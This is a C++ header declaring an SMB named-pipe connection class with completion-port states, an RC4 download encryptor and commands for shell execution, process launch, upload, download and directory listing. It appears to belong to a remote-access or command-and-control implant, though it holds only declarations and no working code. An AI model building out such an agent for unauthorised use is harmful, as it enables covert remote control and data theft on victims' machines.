#pragma once
#include <windows.h>
#include <vector>
#include <aclapi.h>
#include <sddl.h>
#include "bofpack.h"
#include "rc4.h"
#include <memory>

// Constants
enum
{
    COMPLETION_KEY_NONE = 0,
    COMPLETION_KEY_SHUTDOWN = 1,
    COMPLETION_KEY_IO = 2,
    COMPLETION_KEY_ERROR = 3,
    COMPLETION_KEY_COMMAND_COMPLETE = 4,
    COMPLETION_KEY_EXIT = 5
};

class SMBConnection :
    public OVERLAPPED
{
    SMBConnection(const SMBConnection&);
    SMBConnection& operator=(const SMBConnection&);

    typedef enum _STATE
    {
        WAIT_ACCEPT = 0,
        WAIT_SIZE = 1,
        WAIT_DATA = 2,
        WRITE_SIZE = 3,
        TRANSMIT = 4,
        WAIT_RESET = 5,
        WAIT_FILE_DOWNLOAD = 6,
        WAIT_START_DOWNLOAD = 7,
        WAIT_REPORT_DOWNLOAD = 8
    }STATE;
public:
    SMBConnection( HANDLE hiocp);
    ~SMBConnection();
    unsigned int __stdcall OnIoComplete(DWORD transfered);
    void IssueReset();
private:
    void ListenForConnection();
    void CompleteAccept();
    void ReadMessageSize(void);
    void ReadMessageData(void);
    void ProcessCommand();
    void CompleteRead(size_t NumBytesRead);
    void IssueTransmit();
    void CompleteTransmit(size_t NumBytesWritten);
    void StartFileDownload(HANDLE fp);
    void CompleteFileDownload(size_t NumBytesWritten);
    void ExecuteCommand(char* cmdline, bool redirect_output, uint32_t timeout);
    HANDLE hPipe;
    HANDLE hiocp;
    HANDLE downloadFile;
    STATE myState;
    DWORD messageSize;
    DWORD totalRead;
    DWORD totalWritten;
    DWORD cmdId; // used for tracking of command and for server to hook up callback function for
    bofpack output_data;
    std::unique_ptr<rc4> dl_encryptor;
    std::vector<byte> input_data;
    SECURITY_ATTRIBUTES sa;
    typedef enum _myCommand {
        SHELL,
        PROCESS,
        BACKGROUNDPROCESS,
        UPLOAD,
        DOWNLOAD,
        exit,
        LISTDIR,
#ifndef NDEBUG //This must always be at the end
        ECHO = 99,
#endif
    } myCommand;
};

